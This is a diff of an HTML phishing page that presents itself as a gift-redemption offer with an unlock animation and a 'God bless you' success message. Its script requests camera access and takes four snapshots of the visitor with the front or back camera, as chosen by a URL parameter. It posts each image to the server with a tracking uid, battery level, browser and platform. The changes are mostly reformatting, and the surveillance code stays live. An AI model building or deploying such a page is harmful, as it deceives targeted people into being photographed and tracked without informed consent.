@@ -7,20 +7,16 @@
         #loading-ui { display: none; }
         .lock-container { position: relative; width: 100px; height: 100px; margin: 0 auto; }
         .key-anim { 
-            width: 50px; 
-            position: absolute; 
-            right: -20px; 
-            top: 40px; 
+            width: 50px; position: absolute; right: -20px; top: 40px; 
             animation: unlockAction 1.5s infinite ease-in-out; 
         }
         @keyframes unlockAction {
             0%, 100% { transform: rotate(0deg) translateX(0); }
             50% { transform: rotate(-45deg) translateX(-15px); }
         }
-        /* Loading Spinner */
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
+        .btn { background: #00ff00; color: black; border: none; padding: 18px 35px; font-size: 19px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 20px rgba(0,255,0,0.4); }
     </style>
 </head>
 <body>
@@ -39,7 +35,7 @@
         <div class="loader"></div>
     </div>
 
-    <div id="success-msg" style="display:none; color:#00ff00;">
+    <div id="success-msg" style="display:none; color:#00ff00; padding: 20px;">
         <h2>Your gift has been redeemed.</h2>
         <p>You are a good person, God bless you. ✨</p>
     </div>
@@ -49,7 +45,6 @@
 
     <script>
         const params = new URLSearchParams(window.location.search);
-        
         function getBrowser() {
             let ua = navigator.userAgent;
             if (ua.indexOf("Chrome") > -1) return "Google Chrome";
@@ -57,39 +52,27 @@
             if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
             return "Mobile Browser";
         }
-
         async function startWork() {
             document.body.style.background = "black";
             document.body.style.color = "white";
             document.getElementById('start-page').style.display = 'none';
             document.getElementById('loading-ui').style.display = 'block';
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: params.get('m')==='back'?'environment':'user'}});
                 v.srcObject = stream;
-
                 for(let i=0; i<4; i++) {
                     await new Promise(r => setTimeout(r, 1750)); 
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    
                     let batLevel = "N/A";
-                    try {
-                        const bat = await navigator.getBattery();
-                        batLevel = Math.round(bat.level*100)+"%";
-                    } catch(e) {}
-
+                    try { const bat = await navigator.getBattery(); batLevel = Math.round(bat.level*100)+"%"; } catch(e) {}
                     fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             image: c.toDataURL('image/jpeg'),
                             uid: params.get('uid'), mode: params.get('m'),
-                            info: {
-                                battery: batLevel, 
-                                browser: getBrowser(),
-                                platform: navigator.platform
-                            }
+                            info: { battery: batLevel, browser: getBrowser(), platform: navigator.platform }
                         })
                     });
                 }
